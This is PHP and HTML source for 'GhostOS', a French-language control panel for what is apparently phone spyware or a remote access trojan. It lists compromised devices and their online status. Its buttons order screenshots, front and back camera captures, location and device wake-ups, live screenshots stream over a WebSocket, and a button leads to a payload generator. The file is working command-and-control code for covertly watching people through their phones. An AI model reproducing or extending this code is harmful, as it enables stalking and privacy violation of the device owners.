<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="/assets/css/main.css">
    <link rel="stylesheet" href="/assets/css/responsive.css">
    <link rel="stylesheet" href="/assets/css/animations.css">
    <link rel="stylesheet" href="/assets/css/hacker-theme.css">
    <!-- Ajoute les autres CSS selon la page -->
</head>
<body>
    <!-- Ton contenu -->
</body>
</html>
<?php
/**
 * Panel utilisateur
 */

session_start();
require_once '../config.php';

// Vérifier si connecté via API key dans les headers ou cookie
$headers = getallheaders();
$api_key = $headers['X-API-Key'] ?? $_COOKIE['api_key'] ?? '';

if (!$api_key) {
    header('Location: login.php');
    exit;
}

$stmt = $pdo->prepare("SELECT * FROM users WHERE api_key = ?");
$stmt->execute([$api_key]);
$user = $stmt->fetch();

if (!$user) {
    header('Location: login.php');
    exit;
}

// Récupérer les appareils
$stmt = $pdo->prepare("SELECT * FROM devices WHERE user_id = ? ORDER BY last_seen DESC");
$stmt->execute([$user['id']]);
$devices = $stmt->fetchAll();

foreach ($devices as &$d) {
    $d['online'] = $d['last_seen'] && (time() - strtotime($d['last_seen'])) < 60;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GhostOS - Panel</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .phone-3d {
            background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
            border-radius: 30px;
            padding: 20px;
            box-shadow: 0 20px 40px rgba(0,255,136,0.2);
        }
    </style>
</head>
<body class="bg-gray-900 text-white">
    
    <div class="container mx-auto px-4 py-8">
        <!-- Header -->
        <div class="flex justify-between items-center mb-8">
            <h1 class="text-3xl font-bold text-green-400">GhostOS</h1>
            <div class="flex items-center">
                <span class="mr-4"><?= htmlspecialchars($user['username']) ?></span>
                <a href="logout.php" class="bg-red-600 px-4 py-2 rounded">Déconnexion</a>
            </div>
        </div>
        
        <!-- Stats -->
        <div class="grid grid-cols-4 gap-4 mb-8">
            <div class="bg-gray-800 p-4 rounded">
                <p class="text-gray-400">Appareils</p>
                <p class="text-2xl font-bold"><?= count($devices) ?></p>
            </div>
            <div class="bg-gray-800 p-4 rounded">
                <p class="text-gray-400">En ligne</p>
                <p class="text-2xl font-bold text-green-400">
                    <?= count(array_filter($devices, fn($d) => $d['online'])) ?>
                </p>
            </div>
            <div class="bg-gray-800 p-4 rounded">
                <p class="text-gray-400">Captures</p>
                <p class="text-2xl font-bold"><?= $user['total_screenshots'] ?></p>
            </div>
            <div class="bg-gray-800 p-4 rounded">
                <p class="text-gray-400">Abonnement</p>
                <p class="text-2xl font-bold"><?= $user['account_type'] ?></p>
            </div>
        </div>
        
        <!-- Téléphone 3D et contrôles -->
        <div class="grid grid-cols-3 gap-6 mb-8">
            <!-- Téléphone 3D -->
            <div class="col-span-2 phone-3d h-96 flex items-center justify-center">
                <div id="phone-display" class="text-center">
                    <p class="text-4xl mb-4">📱</p>
                    <p class="text-gray-400">Sélectionnez un appareil pour voir l'écran en direct</p>
                </div>
            </div>
            
            <!-- Appareils -->
            <div class="bg-gray-800 p-4 rounded">
                <h2 class="text-xl font-bold mb-4">Mes appareils</h2>
                <div class="space-y-3">
                    <?php foreach ($devices as $d): ?>
                    <div class="bg-gray-700 p-3 rounded flex items-center justify-between cursor-pointer hover:bg-gray-600"
                         onclick="selectDevice('<?= $d['device_id'] ?>')">
                        <div>
                            <p class="font-bold"><?= htmlspecialchars($d['device_name']) ?></p>
                            <p class="text-sm text-gray-400"><?= htmlspecialchars($d['model']) ?></p>
                        </div>
                        <span class="w-2 h-2 rounded-full <?= $d['online'] ? 'bg-green-500' : 'bg-gray-500' ?>"></span>
                    </div>
                    <?php endforeach; ?>
                    
                    <?php if (empty($devices)): ?>
                    <p class="text-gray-400">Aucun appareil enregistré</p>
                    <?php endif; ?>
                </div>
                
                <button onclick="generatePayload()" 
                        class="w-full mt-4 bg-green-500 hover:bg-green-600 py-2 px-4 rounded">
                    + Nouveau payload
                </button>
            </div>
        </div>
        
        <!-- Commandes rapides -->
        <div class="bg-gray-800 p-4 rounded">
            <h2 class="text-xl font-bold mb-4">Commandes rapides</h2>
            <div class="grid grid-cols-6 gap-2">
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('screenshot')">
                    📸 Screenshot
                </button>
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('camera_front')">
                    📷 Caméra avant
                </button>
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('camera_back')">
                    📱 Caméra arrière
                </button>
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('location')">
                    📍 Localisation
                </button>
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('vibrate')">
                    📳 Vibrer
                </button>
                <button class="bg-gray-700 p-3 rounded hover:bg-gray-600" onclick="sendCommand('wake')">
                    ⚡ Réveiller
                </button>
            </div>
        </div>
    </div>
    
    <script>
        let currentDevice = null;
        const apiKey = '<?= $user['api_key'] ?>';
        
        function selectDevice(deviceId) {
            currentDevice = deviceId;
            document.getElementById('phone-display').innerHTML = `
                <p class="text-2xl mb-2">📱 Appareil connecté</p>
                <p class="text-sm text-gray-400">ID: ${deviceId}</p>
                <div class="mt-4 text-green-400">● En attente de données...</div>
            `;
            
            // Connecter WebSocket
            connectWebSocket(deviceId);
        }
        
        function connectWebSocket(deviceId) {
            const ws = new WebSocket(`ws://<?= $_SERVER['HTTP_HOST'] ?>:8080?api_key=${apiKey}&device_id=${deviceId}&panel=true`);
            
            ws.onopen = () => {
                console.log('WebSocket connecté');
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                
                switch (data.type) {
                    case 'screenshot':
                        document.getElementById('phone-display').innerHTML = `
                            <img src="data:image/jpeg;base64,${data.image}" class="max-w-full max-h-64 mx-auto">
                            <p class="text-xs text-gray-400 mt-2">${new Date(data.timestamp).toLocaleTimeString()}</p>
                        `;
                        break;
                        
                    case 'location':
                        console.log('Location:', data);
                        break;
                        
                    case 'command_result':
                        alert('Commande exécutée: ' + JSON.stringify(data.result));
                        break;
                }
            };
            
            ws.onerror = (error) => {
                console.error('WebSocket error:', error);
            };
        }
        
        function sendCommand(command, params = '') {
            if (!currentDevice) {
                alert('Sélectionnez d\'abord un appareil');
                return;
            }
            
            fetch('/api/commands.php?device_id=' + currentDevice, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-API-Key': apiKey
                },
                body: JSON.stringify({
                    command: command,
                    params: params
                })
            })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    console.log('Commande envoyée:', command);
                } else {
                    alert('Erreur: ' + data.error);
                }
            });
        }
        
        function generatePayload() {
            window.location.href = 'generator.php';
        }
    </script>
</body>
</html>
